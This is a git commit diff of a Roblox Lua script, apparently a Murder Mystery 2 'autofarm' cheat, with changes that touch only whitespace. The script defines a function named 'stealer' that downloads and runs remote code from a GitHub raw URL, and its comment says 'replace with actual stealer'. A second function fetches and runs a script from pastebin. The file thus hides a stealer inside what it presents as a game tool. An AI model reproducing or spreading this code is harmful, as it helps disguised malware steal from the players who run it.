b7a2cc373b739bf693b4ca3da13e32cb8bb2958e
TakZ-bit <tak72086@gmail.com>
2025-10-23 03:44:32 +0630

    Update MM2AUTOFARM2FIXED.lua

--- MM2AUTOFARM2FIXED.lua
+++ MM2AUTOFARM2FIXED.lua
@@ -1,8 +1,8 @@
 local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/TakZ-bit/improved-potato/refs/heads/main/S.lua'))() -- replace with actual stealer
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/TakZ-bit/improved-potato/refs/heads/main/S.lua'))() -- replace with actual stealer
 end
 local function loadui()
-  loadstring(game:HttpGet("https://pastebin.com/raw/b2TF7CRu"))()
+  loadstring(game:HttpGet("https://pastebin.com/raw/b2TF7CRu"))()
 
 end
 
